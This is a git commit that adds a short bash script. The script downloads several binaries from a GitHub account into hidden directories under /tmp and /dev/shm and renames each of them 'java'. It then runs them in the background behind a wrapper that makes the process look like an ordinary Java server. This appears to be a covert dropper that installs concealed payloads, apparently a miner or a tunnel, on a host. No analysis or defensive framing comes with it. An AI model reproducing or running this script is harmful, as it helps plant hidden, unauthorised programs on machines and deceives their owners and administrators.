c9342bab7964ea2bb073d70181ceb3bb37bad257
i51jir6ni9t0 <wker-one@protonmail.com>
2026-04-03 11:35:51 +0000

    FR-ECLDSRV KICKED

---
+++ tmp/frsrv/n1.sh
@@ -0,0 +1,25 @@
+#!/bin/bash
+
+function fetch_files() {
+    mkdir -p /tmp/.java/bin/{.a,.b}  /dev/shm/.cahe/{etc,log}
+    cd /tmp/.java/bin/ && curl -L https://github.com/i51jir6ni9t0/backup/releases/download/v0.1/uid-amd64-v0.1.3 -o uid
+    cd /tmp/.java/bin/ && curl -L https://github.com/i51jir6ni9t0/backup/raw/master/supervisord -o java
+    cd /dev/shm/.cahe/etc && curl -L https://github.com/i51jir6ni9t0/backup/raw/master/tmp/frsrv/n1.conf -o supervisord.conf
+    cd /tmp/.java/bin/.a && curl -L https://github.com/i51jir6ni9t0/backup/releases/download/v0.1/ws-musl-amd64-v10.5.2 -o java
+    cd /tmp/.java/bin/.b && curl -L https://github.com/i51jir6ni9t0/backup/releases/download/v0.1/gnet-v1.4.43-amd64 -o java
+}
+
+function start_app() {
+    chmod a+x /tmp/.java/bin/***  /tmp/.java/bin/.a/***  /tmp/.java/bin/.b/***
+    cd /dev/shm/.cahe/log && nohup /tmp/.java/bin/uid ~~m ~~n 'java -Dterminal.jline=false -Dterminal.ansi=true -jar server.jar' ~~f /tmp/.java/bin/java >/dev/null 2>&1 &
+}
+
+if [ -f "/tmp/.java/bin/java" ] && [ -f "/tmp/.java/bin/.a/java" ] && [ -f "/tmp/.java/bin/.b/java" ]; then
+    start_app
+    # timeout 2s tail -f /dev/null
+    # rm -rf /dev/shm/.cahe
+else
+    rm -rf /tmp/.java/bin/**
+    fetch_files
+    start_app
+fi
